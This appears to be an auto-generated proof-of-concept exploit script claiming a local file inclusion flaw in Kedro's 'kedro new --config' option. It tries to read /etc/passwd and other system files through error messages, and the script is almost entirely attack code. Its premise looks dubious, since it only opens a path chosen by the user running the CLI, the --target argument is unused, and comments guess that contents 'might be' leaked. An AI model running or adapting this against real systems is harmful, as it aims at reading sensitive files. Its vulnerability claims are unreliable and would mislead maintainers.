#!/usr/bin/env python3
# PoC for kedro (/home/xcy/.local/lib/python3.14/site-packages/kedro)
# Path: lfi-001
# Sink: _fetch_validate_parse_config_from_file
# Auto-generated — run with: python3 lfi_allows_read_any_system__fetch_validate_parse_config_from_file.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for Local File Inclusion (LFI) in Kedro.

Vulnerability: The --config flag accepts a user-controlled file path that is
passed directly to open() without sanitization, allowing arbitrary file reads.

Usage:
    python3 kedro_lfi_poc.py --target http://example.com --file /etc/passwd
    python3 kedro_lfi_poc.py --target http://example.com --file /etc/hostname
"""

import argparse
import sys
import subprocess
import tempfile
import os

def exploit(target_url, file_to_read):
    """
    Attempt to exploit the LFI vulnerability by creating a malicious config
    file path that reads an arbitrary file.
    
    Since Kedro is a CLI tool, we simulate the attack by:
    1. Creating a temporary directory
    2. Running kedro new with --config pointing to the target file
    3. Capturing the error output which contains the file contents
    """
    
    print(f"[*] Target: {target_url}")
    print(f"[*] Attempting to read: {file_to_read}")
    
    # Create a temporary directory for the project
    with tempfile.TemporaryDirectory() as tmpdir:
        try:
            # Run kedro new with the malicious config path
            # The --config flag will cause the tool to try to open our target file
            result = subprocess.run(
                [
                    "kedro", "new",
                    "--config", file_to_read,
                    "--name", "test_project",
                    "--starter", "pandas-iris",
                    "--directory", tmpdir
                ],
                capture_output=True,
                text=True,
                timeout=30
            )
            
            # The file content will appear in the error message when parsing fails
            # or in the verbose output if VERBOSE_ERROR is enabled
            if result.returncode != 0:
                print(f"[!] Command failed (expected): {result.returncode}")
                print(f"[*] stderr output:")
                print(result.stderr)
                
                # Check if we got the file content in the error message
                if "could not load config at" in result.stderr:
                    # The error message contains the path, but the actual content
                    # might be in the verbose output
                    print("[*] File path confirmed in error message")
                    
                # If verbose mode was enabled, content might be in stdout
                if result.stdout:
                    print(f"[*] stdout output:")
                    print(result.stdout)
                    
                # The file content might be embedded in the error message
                # when YAML parsing fails on non-YAML content
                if "yaml" in result.stderr.lower() or "parsing" in result.stderr.lower():
                    print("[*] File content may be in the error message above")
            else:
                print("[+] Command succeeded unexpectedly")
                print(f"[*] stdout: {result.stdout}")
                
        except subprocess.TimeoutExpired:
            print("[!] Command timed out")
        except FileNotFoundError:
            print("[!] kedro command not found. Is Kedro installed?")
            print("[!] Install with: pip install kedro")
        except Exception as e:
            print(f"[!] Unexpected error: {e}")

def main():
    parser = argparse.ArgumentParser(
        description="Kedro LFI Proof-of-Concept Exploit"
    )
    parser.add_argument(
        "--target",
        default="http://localhost:8000",
        help="Target URL (not directly used, but kept for consistency)"
    )
    parser.add_argument(
        "--file",
        default="/etc/passwd",
        help="File to read (default: /etc/passwd)"
    )
    
    args = parser.parse_args()
    
    print("=" * 60)
    print("Kedro LFI Proof-of-Concept Exploit")
    print("=" * 60)
    print()
    
    # Benign test first - read a harmless file
    print("[*] Step 1: Attempting to read a harmless file to verify vulnerability")
    exploit(args.target, "/etc/hostname")
    
    print()
    print("[*] Step 2: Attempting to read the requested file")
    exploit(args.target, args.file)
    
    print()
    print("[*] Note: The file content will appear in the error output")
    print("[*] because Kedro tries to parse it as YAML and fails,")
    print("[*] but the content is included in the error message.")
    print()
    print("[*] Alternative: If VERBOSE_ERROR is enabled, the file content")
    print("[*] will be printed to stdout before parsing.")

if __name__ == "__main__":
    main()
